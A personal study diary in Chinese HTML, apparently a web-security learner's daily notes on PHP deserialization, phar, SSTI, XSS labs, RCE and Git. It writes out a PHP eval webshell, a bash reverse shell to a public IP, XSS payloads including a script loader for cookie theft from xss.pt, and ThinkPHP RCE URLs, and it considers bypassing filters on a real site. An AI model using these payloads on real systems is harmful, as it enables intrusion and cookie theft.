+		<br><a href="https://ca01h.top/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87/">反序列化高级详细介绍</a>
+		<br>今天遇见个电科大佬，可惜有点听不懂他的四川话，不但嫖了个flag，还学了F12的新操作。
+		<br><i class="green">tip：用f12左上角可以从页面选择控件直接找到对应代码，很多时候很方便.</i>
+		<br>
+		<br>
+		<br>
+		<br>😥😥😥😥😥😥😥😥😥😥😥😥😥😥php代码审计搞不来，先学PHP基本语法吧.
+		<h2 class="aqua"><div id="PHP"><img src="php1 (2).jpg" alt="php2" title="2"></div></h2>
+			<div class="php">
+				创建数组:$xxx=array("a","b","c","d");
+				<br>输出:echo $xxx[0];echo $xxx[3];
+				<br>循环输出:for($x=0;$x<3;$x++)
+				<br>{echo $xxx[$x];echo "<'br'>";}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b class="aqua">PHP很多语法与C很相似</b>
+				<br>关联数组(是使用经分配的键指向值的数组):$xxx['a']="aa";或者$xxx=array("a"=>"aa","b"=>"bb");
+				<br>&nbsp;&nbsp;&nbsp;&nbsp;对关联数组，可通过数据的键使用值:echo $xxx['aa'];
+				<br>遍历关联数组:foreach($xxx as $x=>$x_value)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class="aqua">‘=>’用于将‘键key’赋给‘值value’</i>
+				<br>{echo "逐个输出key:".$x."逐个输出value:".$x_value;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class="aqua">PHP用.连接字符串</i>
+			</div>
+	</div>
+	<hr>
+
+	<div id="10.22" >
+		<h3 class="z">10.22</h3>
+		<div class="php">
+			\\php中的while,dowhile,for($i=1;$1<5;$++;)循环均与c中一模一样.
+			<br>PHP函数:function function_name(){\\执行内容},函数可在任意处调用.
+			<br>给函数添加参数:function name($fname){echo $fname."last name.<'br'>";}，此时可用name("Mike")调用函数,输出为:Mike last name
+			<br>函数返回值return:<u>function add($x,$y){$total=$x+$y;echo $total;}&nbsp;&nbsp;&nbsp;&nbsp;echo add(1,16);</u>输出:17
+			<br>魔术<b>常</b>量:_LINE_输出当前行号，字符串用''调用
+			<br>__FILE__输出文件绝对路径
+			<br>__DIR__输出文件所在文件夹路径
+			<br>__FUNCTION__输出函数名
+			<br>__CALSS__输出类名.
+			<h4>PHP面向对象程序设计</h4>
+			<img src="php1.jpg" alt="php" title="phphph">
+			<br>{}内定义方法和变量，类的变量用<u>var $xxx=1;</u>来声明，函数只能该类及其实例化的对象才能访问
+			<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注：$class为自身变量，PHP_EOL为换行符.
+			<br>$x=new xxx;将类的对象实例化.
+		</div>
+	</div>
+	<hr>
+
+	<div id="10.23">
+		<h3 class="z">10.23</h3>
+		访问对象中的成员:<i>$对象名=new 类名称([参数]);
+		<br>$对象名->成员属性=值;
+		<br>$对象名->成员属性;
+		<br>$对象名->成员方法;
+		</i>
+		<br>可调用function a(){echo "a的值为".$this->a=$a;},用a1->a();输出a的值.
+		<br>在调用前可将其更改$a1->a="aaaa";即a的value由被赋值为aaaa.
+		<br><p>
+		类的关键字:1.static 将类的成员属性定义为静态，public static $a=111;
+		<br>调用时要用echo class_name::$a;
+		<br>输出静态方法：<u>class_name::function_name();</u>
+		<br>给静态属性赋值：<u>class_name::$a=112;</u>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b class="green">相当于将一般属性的->换为了::,且static属性实例化无需定义新变量可直接用class_name</b>
+		<br>定义常量:const CN="Shina",调用使用echo class_name::CN;输出Shina。
+		</p>
+		<b class="red">tip:当由magic函数__wakeup时可通过“序列化字符串的对象属性数与原对象属性数不同则跳过__wakeup”绕过限制。</b>
+	</div>
+	<hr>
+
+	<div id="10.24">
+	<h3 class="z">10.24(程序员节捏)</h3>
+		<div class="php">
+		<h2>POP链</h2>	常见的POP链方法:命令执行----exec(),passthru(),popen(),system()文件操作---file_put_contents(),file_get_contents(),unlink().
+		<h4>ThinkPHP框架</h4>	网站框架可用来搭建复杂的网站，基本结构为通过目录嵌套实现网页嵌套，例如实现网页上传功能的url为123.123.123.123:8080/index.php/index/index/upload<br>	可能为index模块中打开index的controller打开index类打开upload函数，最终实现上传功能，可通过查看该函数进行代码白盒审计.
+		<br>
+		通过审计可得到绕过文件上传的手段与找到反序列化漏洞。
+		</div>
+	</div>
+	<hr>
+
+	<div id="10.25">
+		<h3 class="z">10.25</h3>
+		反序列化漏洞的核心为:找到反序列化时调用的魔术函数漏洞，例如用file_get_contents()读取文件。
+		<br>重要参考:
+		<br><a href="https://zwh-china.top/2021/10/25/%E4%BA%8C%E9%9D%A2%E4%BB%BB%E5%8A%A1%E4%B8%80%E7%AC%AC%E4%B8%80%E9%A2%98%E5%B0%8F%E7%9F%A5%E8%AF%86/">Thinkphp框架</a>
+		<br><a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">phar反序列化</a>
+		<br><a href="https://www.cnblogs.com/yunqian2017/p/13308599.html">极客大挑战RCE</a>
+		<br>怎么还是做不出来啊😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭😭
+	</div>
+	<hr>
+
+	<div id="10.26" >
+	<h3 class="z">10.26</h3>
+	<div class="php">
+		<h2>phar反序列化</h2>
+		phar是一种PHP伪协议，可打开路径下的文件
+		<br><img src="2.jpg" alt="phar" title="phar">
+		<br>phar是一种文件存档，可产生类似include<>的文件包含漏洞
+		<br>将包含phar方法的php文件上传到服务器，再利用phar://调用文件时产生的反序列化
+		<br>例如file_get_contents(phar://....)可读取文件内容从而RCE(获取权限)得到flag
+		<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;phar攻击的条件:
+		<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.文件上传点($content=$file)
+		<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.系统文件操作函数(file_get_contents)
+		<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.phar://伪协议
+	</div>
+	</div>
+	<hr>
+
+	<div id="10.27">
+	<h3 class="z">10.27</h3>
+	<div class="php">
+		<a href="https://mp.weixin.qq.com/s/OS_aX0sMnp0H31DCc-nP0A">phar反序列化入门</a>
+		<br><a href="http://104.238.183.19/">本地搭的题目(已因VPS重装失效)</a>
+		<br>基本思路：
+		<br>1.通过源码构造phar文件
+		<br>2.绕过正则表达式上传到服务器
+		<br>3.file_get_contents调用phar文件产生反序列化漏洞
+		<br>4.RCE获取flag
+		<br>要学的点:&nbsp;	&nbsp;&nbsp;&nbsp;1.如何绕过正则表达式
+		&nbsp;&nbsp;&nbsp;&nbsp;2.如何构造phar文件获取RCE
+	</div>
+	</div>
+	<hr>
+
+	<div id="10.28">
+	<h3 class="z">10.28</h3>
+	<div class="php">
+		绕过正则表达式似乎需要将phar文件压缩，但还是搞不懂
+		<h2>phar反序列化</h2>
+		<img src="115.jpg" title="phar" alt="phar">
+		<br>将如上php文件上传服务器并用浏览器访问，会在同目录生成phar文件:
+		<br><img src="phar.jpg" alt="oho" title="zz">
+		<br>再打开使用了file_get_contents(phar://....)的php文件，会发现页面为phpinfo().
+		<br><img src="info.jpg" alt="infophp" title="infophp()">
+	</div>
+	<div class="php">
+		通过Linux压缩(gzip phar.phar)，可通过编码绕过正则表达式，但编码后仍然可以触发phar反序列化漏洞<br>
+		<img src="gzip.jpg" alt="gzip" title="gzip">
+		<br><a href="https://blog.csdn.net/CSDNiamcoming/article/details/108883642?utm_source=app&app_version=4.17.2&code=app_1562916241&uLinkId=usr1mkqgl919blen
+	">如何构造phar反序列化(做这个题最关键也最难的地方)</a>
+		<br>手动装了php,nginx,mysql，果然还是nginx最麻烦
+		<br>nginx的配置文件nginx.conf需要改<b class="red">fastcgi_pass</b>参数为ip，端口任意
+		<br><img src="nginx.jpg" title="nginx" alt="n">
+		<br>目录可用root /var/www修改
+		<br>现在的问题:<b>环境搭建完却无法运行leadshop源码</b>
+	</div>
+	</div>
+	<hr>
+
+	<div id="10.29" >
+	<h3 class="z">10.29</h3>
+		<div class="php">
+			白烂了，用宝塔搭了，但找漏洞还是麻烦事.
+			<br>但phar仍然不知道怎么构造，POP链真有点呃呃了😅😅😅😅😅
+			<br><br>
+			<br>从此用VScode写PHP和html了！
+			<br><img src="vsd.jpg" alt="vsd" title="vscode">
+
+			<h3><a href="https://www.php.cn/php-weizijiaocheng-427052.html">PHP魔术函数分析</a></h3>
+			注:面向对象编程时调用对象内的属性需要用对象内的函数输出.<code>$person->function_name.</code>
+			<br>
+			1.__construct([参数列表]){方法体：给成员属性进行初始化赋值}
+			<br><i class="red">在开始时触发</i>
+			<br>2.__destrust(){方法体}
+			<br><i class="red">在对象调用结束时触发</i>
+			<br>注:析构函数不可带有参数.
+			<br>3.__call(string $function_name,array $arguments){}
+			<br>__call有两个参数，$function_name接收不存在的方法名，$arguements以数组方式接受不存在方法的参数
+			<br><i class="red">在调用不存在方法时调用</i>例如:
+			<br><img src="call.jpg" title="call" alt="call">
+			<br>4.__callStatic()与__call一样，只不过是调用<b class="green">静态</b>方法($person::run(55))
+			<br>5.__get(){}
+			<br>可在对象的外部获取私有属性的值
+			<br><i class="red">直接调用private属性时，会自动调用__get()</i>
+			<br>6.__set($name,$value){}
+			<br>设置私有属性时，给未定义的属性赋值时，触发此方法:两个变量一个为属性名，一个为属性值，分别赋值给两个参数
+			<br><i class="red">赋值类的成员变量时调用</i>&nbsp;&nbsp;&nbsp;&nbsp;可用于限制赋值范围
+			<br><img src="set.jpg" alt="set" title="set">
+			<br>7.__unset()
+			<br><i class="red">当在对象外部使用unset()函数删除非public属性时调用</i>
+			<br>解析:创建对象时传参("小明",25)将值赋给方法__construct,开头为形参
+			<br>创建对象后用unset()删除属性,当public时直接删除，非public则需用__unset()，删除时会调用该方法执行方法内的语句，若成功删除则isset()函数会返回真(即1)
+			<br><img src="unset.jpg" alt="unset" title="unset"><br>
+			<p>删除后输出被删除的非public变量，发现为空，证明删除成功.</p>
+			<img src="aabb.jpg" alt="aa" title="bb">
+			<br>8.__isset()
+			<i class="red">当对不可访问的属性调用isset()函数或empty()函数时会触发该方法</i>
+			<br>9.__sleep()
+			<br>无卵用，在序列化时会优先序列化__sleep(){}方法内的属性
+			<br><b class="aqua">10.__wakeup()</b>
+			<br><i class="red">执行unserialize()函数时会优先调用__wakeup方法</i>
+			<br>在执行反序列化时非常常见，多用于阻止POP链连接，通过最优先级截断调用函数。
+			<br>但可用序列化后属性小于实际对象中的属性来绕过，多将序列化后的字符串1改为2即可。
+			<br><h4 class="red">11.__tostring()</h4>
+			<i class="red">类被<B class="green">当作字符串调用</B>时触发，多在有echo $obj,print %obj函数时发生
+				<br>但注意var_dump()和print_r()输出数组不能触发</i>
+			<img src="tostring.jpg" alt="tostr" title="ss">	
+			<br>例如有A，B类，<code>$a=new A();$b=new B();$b->token=$a</code>若在B类有<code>echo $this->token;</code>
+			<br>则A类此时被当作字符串来echo，故会触发__tostring().
+			<br>若无__tostring()函数仍有<code>echo $person</code>会发生语法错误.
+			<br>注:preg_match()匹配正则表达式时也会做字符串调用，会触发__tostring方法.
+	 	</div>
+	</div>
+	<hr>
+
+	<div id="10.30">
+	<h3 class="z">10.30</h3>
+	<div class="php">
+		<b class="red">12.__invoke()</b>
+		<br><i class="red">与__tostring对应,当直接以<b>函数方式【即$name()】</b>调用一个实例化的对象时会调用</i>
+		<br>例如<code>$person=new Person();$person();</code>
+		<br><img src="invoke.jpg" alt="invoke" title="invoke">
+		<br>暂时先了解这么多,以后遇到再查<a href="https://www.php.net/manual/zh/">PHP手册</a>即可.
+		<br><a href="https://www.freebuf.com/articles/web/290759.html">反序列化思路与RCE入门</a>
+		<a href="https://ca01h.top/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87/">反序列化构造</a>
+		<br>PHP反序列化就到此为止了，关键还是在POP链的构造。
+	</div>
+	</div>
+	<hr>
+
+	<div id="10.31">
+	<h3 class="z">10.31</h3>
+	<h2>FlaskSSTI</h2>
+	<div class="flask">
+		模板作用::拿到数据,塞到模板里,然后让渲染引擎将塞进去的东西生成 html 的文本,最后返回给浏览器.
+		<br>flask是一种python的第三方库，可用于pythonweb编程，在本地搭建环境后可通过访问127.0.0.1:5000访问flask网页
+		<br>当使用<code>query=request.args.get('name') #通过get获取name的值 return reder_template('demo_tmp.html',name=query)</code>会将get接受的name传入模板进行渲染
+		<br>访问页面127.0.0.1/?name=xxx会发现页面随传值而改变
+		<br>但当渲染的路径并未通过<code>name=query</code>写死，而是直接将url中的值插入模板渲染，就可能存在SSTI注入漏洞，即在渲染时会将url中的语句解析
+		<br><img src="SSTI.png" alt="ssti" title="ssti">
+		<br>
+	</div>
+	</div>
+	<hr>
+
+	<div id="11.1">
+		<h2 class="z">11.1/11.2</h2>
+		最近在学C语言，循环蛮有意思的。
+		<br>感觉很难的地方是如何构造循环和确定循环起始结束点
+		<br>冒泡算法和选择算法也挺有意思.
+	</div>
+	<hr>
+
+	<div id="11.3">
+		<h2 class="z">11.3</h2>
+		<div class="php">
+			<h3>反序列化成因</h3>
+			序列化的字符串可以保存类的基本信息，反序列化的过程可以将这个特殊的字符串重新还原成类,
+			<br>虽然在整个序列化与反序列化的过程中我们无法控制类方法的改变(这个主要指后台的自定义函数)，但是我们却可以通过复写变量并借用类中自定义好的方法(服务器上的)或魔术方法(服务器存在的或本地自定义的)，并借用敏感函数来达到恶意效果。
+		<h4>基本函数</h4>
+		exec是默认禁用的敏感函数，调用需要在ini中设置禁用函数列表
+		<br>结构:<code>exec( string $command [,array &$output [, int &$retrun_var ]]);</code>
+		<br>commond为要执行的命令，后两个参数可不管,一般将命令赋给$commend再调用$commend<br>
+		<img src="exec.jpg" alt="exec" title="exec">	
+		<br>base64_decode()为解密base64函数,相对应的base64_encode()为加密.
+		</div>
+	</div>
+	<hr>
+
+	<div id="11.4">
+		<h2 class="z">11.4</h2>
+		矩阵乘法搞出来啦happy<br>
+		<img src="Juzhen.jpg" alt="juzen" title="juzhen">
+	</div>
+	<hr>
+
+	<div id="11.5">
+		<h2 class="z">11.5</h2>
+		trojan果然是最好用的翻墙方法之一，今天又从头搞了一遍，可惜在SSL证书这里卡住了，还是用了脚本，下次一定用纯手搭.
+		<br>nginx的配置已经熟悉多了，关键在<b class="aqua">nginx.conf</b>文件，还有就是用<code>nginx -t</code>命令输出报错信息修改
+		<br><img src="nginx-t.jpg" alt="t" title="nginx-t">
+		<br>域名与DNS解析也是，改cloudfareDNS很方便
+		<br>关键逻辑是搭建一个伪装网站，用TCP握手检测若为一般HTTPS请求就显示伪装网页，若为trojan请求形式则用443端口配置代理流量
+		<p><img src="trojan.svg" alt="trojan" title="trojan">
+			<b class="red">如图,Trojan工作在443端口，并且处理来自外界的HTTPS请求，如果是合法的Trojan请求，那么为该请求提供服务，否则将该流量转交给web服务器Nginx，
+			<br>由Nginx为其提供服务。基于这个工作过程可以知道，Trojan的一切表现均与Nginx一致，不会引入额外特征，从而达到无法识别的效果。
+			<br>当然，为了防止恶意探测，我们需要将80端口的流量全部重定向到443端口，并且服务器只暴露80和443端口，这样可以使得服务器与常见的Web服务器表现一致。</b>
+		</p>
+	</div>	
+	<hr>
+
+	<div id="11.6">
+		<h2 class="z">11.6</h2>
+		今天半夜大吼的撸批真的是纯纯的低能😓😓
+		<br>编程时一定要仔细考虑逻辑的严谨性，否则出错很难检查出来，今天写了个找鞍点的题深有体会，因为判断少了一句重新初始化调试了半天才搞明白。
+		<br>冒泡算法很有意思，关键是所选行与遍历行间的比较和交换
+	</div>
+	<hr>
+
+	<div id="11.7">
+		<h2 class="z">11.7</h2>
+		Σ(っ °Д °;)っ居然过二面了！已经到最后了吗……最近要肝了，但方向似乎还是有点模糊，该继续学POP链还是学XSS和命令行好？下次问下学长好了。
+		<br><br>
+		又发现了新的有用的魔术方法调用总结,存下来仔细看:<br>
+		<img src="POPOP.jpg" alt="pop" title="pop">
+		<br><b>反序列化本质:敏感函数与<b class="red">可控</b>的属性参数.</b>
+	</div>
+	<hr>
+
+	<div id="11.8">
+		<h2 class="z">11.8</h2>
+		POP链构造的关键还是在魔术方法的运用与可控属性的修改，最终payload可用urlencode()将序列化后的数据进行URL编码
+		<br>序列化后的字符串通过方法和类间的调用信息和对类内属性的修改完成攻击。
+		<br>还是不会构造POP链😥😥
+		<div class="shell">
+		又浪费了几天时间，不得不放下你了，POP链，不然真要把我逼疯了😣
+		<br>开始学骚操作，一句话木马帅到掉渣了，可惜不能用蚁剑连接本地的shell，但能控制后台增删改查也让人很爽
+		<br>php一句话木马:<code><b class="red"><'?php @eval($_REQUEST["hacker"]);?'></b></code>
+		<br>可用的条件:<br>
+		<img src="loudong.jpg" alt="yijuhua" title="一句话密码">
+		<br>@可使语句即使执行失败也不报错，防止出现日志文件
+		<br>eval();是危险函数，可执行参数内的命令
+		<br>传参变量为"hacker"，可用蚁剑连接一句话木马文件的地址，再用hacker连接
+		<br>---其实原理很简单，调用php文件出现漏洞，在hacker中传参可利用eval();函数执行php命令,例如可用__DIR__等魔术常量查看文件结构
+		<br>-----即蚁剑连接只是将命令执行图形化
+		<br><i>仔细一想一句话木马其实文件上传漏洞和代码执行漏洞，并非getshell，所得到的权限也仅仅增删改查而已</i>
+		<br><b class="red">一句话木马有非常多的变体，关键在绕过上传限制(抓包改后缀)和文件内容审查(编码)将文件上传至服务器成为后门</b>
+		<br>有意思的是，一句话木马确实高效恐怖，在windows系统写个一句话木马的php文件改完后缀名就被WD火速杀了 
+		</div>
+	</div>
+	<hr>
+
+	<div id="11.9">
+		<h2 class="z">11.9</h2>
+		<div class="shell">
+			<h2>反弹shell入门</h2>
+			关键在Linux命令的利用和nc命令行，还得搞个公网IP的kali linux进行攻击<br>
+			第一步：在vultrVPS上搭个Kali，kali实际上是安装在docker里的
+			<br>---docker为web服务器容器
+			<br><img src="docker.jpg" alt="docker" title="docker">
+			<br>||输出<code>hello from docker</code>说明安装成功
+			<br>
+			<br>利用nc的端口监听可实现getshell：
+			<br><img src="nc.jpg" alt="nc" title="nc">
+			<br>attacker:<code>nc -lvp 2333</code>
+			<br>victim:<code>bash -i >& /dev/tcp/104.238.183.19/2333 0>&1</code>
+			<br>
+		</div>
+	</div>
+	<hr>
+
+	<div id="11.10">
+		<h2 class="z">11.10</h2>
+		<div class="shell">
+			nc中-l为监听，-v为持久监听输出详细监听信息，-p为特定端口
+			<br>=====(注:不同的VPS可能又不同的命令,例如阿里云和腾讯云等【端口监听】需要用-lvnp)
+			<br><a href="https://www.sqlsec.com/2019/10/nc.html">nc命令入门</a>
+			<br><a href="https://cloud.tencent.com/developer/article/1432599">基本nc命令</a>
+			<br>bash是常见shell，-i表示交互式shell
+			<br>/dev/tcp/ip/port用于实现与监听端口的socket通信，并非实际存在的文件，<b>在此文件写入命令可实现端口通信</b>
+			<br>-------但要实现命令还需要用>重定向
+			<br>0>&1表示在受害机上无回显
+			<br><a href="https://xz.aliyun.com/t/2549">该语句详细解析与构造</a>
+			<br>那么如何在受害机的shell上执行该命令实现反弹shell呢?其实是需要<b class="red">受害机调用了敏感函数exec()并且函数参数可控</b>
+		</div>
+	<b>tips:通过get方式给数组传参:<code>data['one']=121&data['two']=1515</code></b>
+		<div class="shell">
+			nc命令作用实际仅仅为监听端口，真正实现通信连接的为bash命令，通过<，0>&1等操作控制输出执行命令的结果
+			<br>----因此反弹shell关键在<b class="yellow">传参的构造与绕过blacklist</b>
+			<br>经过简单的渗透测试，where_is_my_FUMO题目的写定构造命令<code>bash -c \bash -i < /dev/tcp/IP/Port</code>
+			<br>可用nc成功连接,但执行的命令无法在攻击机输出,而是在受害机输出执行结果
+		</div>
+	</div>
+	<hr>
+
+	<div id="11.11">
+		<h2 class="z">11.11</h2>
+		胡思乱想:突然感觉很多漏洞都是因为Get&Post传参不安全(对称传参)产生的，不知道有没有不对称的传参办法🤔
+		<div class="shell">
+			bash为一种shell连接方式，各种参数具体功能如下:
+			<br><img src="bash.png" alt="bash" title="bash">
+			<br>-----bash -c""为执行c后字符串命令
+			<code>bash -i >& /dev/tcp/104.238.183.19/2333 0>&1</code>详解:
+			<br><img src="bsh.jpg" alt="bsh" title="bsh">
+			<h3>linux中特殊字符用法</h3>
+			反斜线\用法:转义特殊字符，在行尾时用作连接下一行
+			<br>#:注释掉井号后面的命令
+			<br>分号;用于连续指令连接几个命令依次执行
+			<br>双引号:特定字符串，但允许变量拓展
+			<br>-----单引号不允许变量拓展
+		</div>
+		<b class="red">Tips:当函数内有""时，在引号内的命令若有引号，必须用反斜线转义以防止闭合出错</b><br>
+		<code>exec("bash -c \"bash -i < /dev/tcp/$addr/$port\"");</code>
+		<br><a href="https://xz.aliyun.com/t/2548">这里还是不懂怎么构造，没搞懂Linux底层文件是怎么回事，有空一定要搞明白</a>
+	</div>
+	<hr>
+
+	<div id="11.12">
+		<h2 class="z">11.12</h2>
+		<div class="xss">
+			XSS核心是javescript代码注入进正常的html文件，攻击的基础是强大的JS语法。
+			<br>Js举例:<botton onclick="xss()"><b class="aqua">点我出现弹窗</b></botton>
+			<script>
+				function xss(){
+					alert('铸币！');
+				}
+			</script>
+			<br>多出现在有用户交互的并将用户可控内容插入网页源文件中的部分，例如站内信，网页评论。
+			<br>主要有反射型，存储型，DOM型三种XSS:
+			<p>
+				反射型XSS存在与Url中，故需要用户点击使浏览器解析带有XSS的js代码<br>
+				攻击的流程如下：<br>
+				1.攻击者寻找具有漏洞的网站<br>
+				2.攻击者给用户发了一个带有恶意字符串的链接<br>
+				3.用户点击了该链接<br>
+				4.服务器返回HTML文档，此时该文档已经包含了那个恶意字符串<br>
+				5.客户端执行了植入的恶意脚本，XSS攻击就发生<br>
+			</p>
+		</div>
+	</div>
+	<hr>
+
+	<div id="11.13">
+		<h2 class="z">11.13</h2>
+		<div class="xss">
+		存储型XSS攻击:<br>
+		1.用户提交了一条包含XSS代码的留言到数据库<br>
+		2.当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来<br>
+		3.浏览器发现有XSS代码，就当做正常的HTML和JS解析执行<br>
+		<hr>
+		做了<a href="https://www.cnblogs.com/xiaomeng2333/p/11595786.html">xss-labs</a>，简单总结下绕过过滤的操作:
+		<br>2.看源码发现可控的参数在标签内，需要闭合标签
+		<br>3.1过滤了尖括号，可利用先闭合"再在标签内构造onclick="alert(1)"绕过[onclick表示点击输入框会<b>触发执行JS代码的事件</b>]
+		<br>3.2也可构造onmouseover="javascript:alert(1)"绕过
+		<br>4.过滤了on和script，无法构造事件，但未过滤尖括号，可用<'a href="javascript:alert(1)">绕过
+		<br>5.过滤了href，但<b>html编码不区分大小写</b>，可用hErF绕过
+		<br>6.过滤了href，双写绕过
+		<br>7.替换了on，script等关键字，可用<b class="aqua">编码</b>绕过，用<b>hackbar</b>的xss工具编码很方便
+		<br>8.似乎用转义过滤了尖括号和关键字
+		<br><img src="js.jpg" alt="js" title="js">
+		<br>利用编码和注释//绕过
+		<br>9.无注入点，get传参全部过滤，仔细读源码发现有<code>value type="hidden"</code>的input框，说明有隐藏的输入框
+		<br>将隐藏元素设为可见，在审核元素处添加onclick="alert(1)"事件，点击输入框即完成XSS
+		<br><img src="input.jpg" alt="input" title="hidden">
+		<br>10.注入点可能在http请求处，例如src=aaa，aaa为可控的参数，可通过改变aaa完成xss，若有ng-include:限制只能连接本地文件
+		<br>可用伪路径完成攻击，例如<code><b class="aqua">src="index.php?name=<'img src=x onerror=alert(1)'>"</b></code>
+		<br><b class="yellow">总结</b>:<br><img src="lab.jpg" alt="lab" title="lab">
+		</div>
+	</div>
+	<hr>
+
+	<div id="11.14">
+		<h2 class="z">11.14</h2>
+		<div class="xss">
+			反射型与存储型的区别主要在于反射型无<b>数据库</b>参与，存储型无需发送url到用户界面，只要等用户直接自己点击
+			<br>-------反射型流程:由前端漏洞xss注入后端，hacker将该url发送至受害者，受害者点击url浏览器解析xss代码产生攻击
+			<br>----漏洞数据流为:前端->后端->前端
+			<br>-------存储型流程:由前端漏洞将xss代码提交给后端，后端将代码存储至数据库，当由用户访问页面时，服务器从数据库中提取代码返回浏览器，浏览器在前端解析产生xss攻击
+			<br>----漏洞数据流:前端->后端->数据库->后端->前端<br><br>
+			xss基本知识同样是各种绕过，并将触发后的漏洞信息发送至xxs平台
+			<br>例如xxs.pt就可以提供代码盗取cookie，不过现在自己还是没搞懂具体盗取cookie的流程和原理
+			<br>有意思，xxs.pt里已经提供了相当强大的攻击代码，直接插入<'script'>或者用不可见的img都可以盗取cookie
+			<br><img src="cookie.jpg" alt="cookie" title="cookie">
+			<br>例如:<b><code><'img src=x onerror=s=createElement('script');body.appendChild(s);s.src='https://xss.pt/Rus8';'></code></b>
+			<br>之后一定要把这个js代码搞明白
+			<br>已经知道的点:src=x表示路径错误，图片无法显示，此时触发<i class="aqua">onerror事件</i>后的js代码
+			<br>-------s.src='http://...'为远程调用的js文件，该文件内为真正的XSS攻击JS代码
+		</div>
+	</div>
+	<hr>
+
+	<div id="11.15">
+		<h2 class="z">11.15</h2>
+		<div class="xss">
+			注:反射型xss攻击大多利用<b>get传参</b>产生的前端漏洞，因此利用<b class="green">url拼接</b>就能完成钓鱼链接的构造
+			<br>-----------因此若QQ等大厂网站出现此漏洞会让受害者警惕性下降
+			<br>其他绕过姿势:1.<'img onerror=alert(1)'>可无需script标签直接执行JS语句
+			<br>----类似的标签属性还有onmouseover,onclick,利用weight等属性可使元素覆盖整个页面
+			<br>2.编码绕过无法直接执行，需要利用<b>eval()函数</b>(JS伪协议还需用string.fromCharCode()函数)
+			<br>----例如:<code>http://192.168.1.102/xss/example5.php?name=<'script'>eval(\u0061\u006c\u0065\u0072\u0074(1))<'/script'></code>
+			<br>3.利用JS解析时会忽略tab和空格，将回车或tab插入关键字中绕过过滤
+			<br><img src="raoguo.png" alt="rapguo" title="raoguo">
+			<hr>
+			<br>可利用的JS语句(以下懒得转义故省略script标签):
+			<br>1.document.write()，用于网页像文档中输出内容
+			<br>2.alert()，用于弹窗
+			<br>3.window.location.href='http://www.baidu.com'，用于网页跳转
+			<br>4.alert(document.cookie)用于获取网页cookie
+			<br><b class="green">常用DOM方法:</b><br>
+			<img src="xssdom.png" alt="dom" title="dom">
+			<br>仔细审查了下bangumi的get传参页面，看起来有点危险，而且似乎可用cookie登录且无http-only🤔
+			<br>传参过滤简单粗暴过滤了尖括号(防止闭合title)和双引号(防止闭合value)，怎么绕过好呢……
+		</div>
+	</div>
+	<hr>
+
+	<div id="11.16">
+		<h2 class="z">11.16</h2>
+		<div class="xss">
+		JS中可用';'分割语句，可用'//'注释语句
+		</div>
+		<h3>命令执行漏洞:</h3>
+		windows：
+		<br>ping 127.0.0.1|whoami(输出当前路径)表示执行|后面的语句
+		<br>||表示前面出错执行后面语句
+		<br>&表示前面为假执行后面语句
+		<br>linux:
+		<br>;先后执行前后语句
+		<br>|执行后面语句
+		<br>||，&与windows相同
+		<br>//注:linux常用命令:1.ls显示所有文件，ls ../../..显示上上上级目录文件
+		<br>2.cat flag.txt打开文件
+		<br>3.find / -name "flag.txt"利用文件名全局查找文件
+		<hr>
+		<h2>RCE入门</h2>
+		<a href="https://blog.csdn.net/Mr_helloword/article/details/107924218">攻防世界rce</a>
+		<br>基本思路仍然为命令执行漏洞
+		<br>例如找thinkphp框架的漏洞:6、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=<b>id</b>(=后为真正的命令语句)
+		7、http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+		<br><img src="rce.jpg" alt="rce" title="rce"><br>
+		发现可以执行命令，综合利用linux语句ls,cd,cat等找flag(不对,cd无回显完全没用，主要用ls,cat,find找目录😓)
+		<br><img src="cat.jpg" alt="cat" title="cat">
+		<h2>php文件包含漏洞</h2>
+		<b class="red">include</b> $data时:<br>
+		<img src="wei.jpg" alt="wei" title="伪协议">
+		<br>php://input伪协议需要用post方法传参php语句才可执行
+		<br>php://filter可在php.ini双off的情况下使用，可用read读取文件名
+		<br>其中data://似乎尤其危险，可直接用/text/plain,<?php...?>执行代码，若过滤尖括号还可用<b class="red">;base64,xxxx(编码后的php语句)</b>
+		<br><img src="include.png" alt="inclide" title="include">
+		<br>---------如上图php官方解释，include在有路径时会忽略include_path直接执行路径,例如<code>include source.php?/../../../../../../ffffllllaaaagggg</code>会将前面的source.php文件忽略
+	</div>
+	<p>做了攻防世界的web题目，有点停不下来，蛮有意思的🤗,才发现之前不会做是做题太少，还有做xss一个在线靶场时也有同样感觉.
+	<hr>
+
+	<div id="11.17">
+		<h2 class="z">11.17</h2>
+		<h1>Git入门</h1>
+		<div class="git">
+			Git是一种分布式的版本控制系统
+			<br>创建git仓库:<code>git init</code>
+			<br>将文件放入git仓库需要两步:1.<code>git add xxx.txt</code>  2.<code>git commit -m "message（修改信息）"</code>
+			<b class="red">注意:git命令必须在相应的仓库目录下，故在bash用git前必须进仓库目录</b>
+				<br><img src="git.jpg" alt="git" title="gir">
+			<br>回退上一个提交的文件版本:git reset --hard HEAD^(^表示上一个版本，^^表示上两个版本)
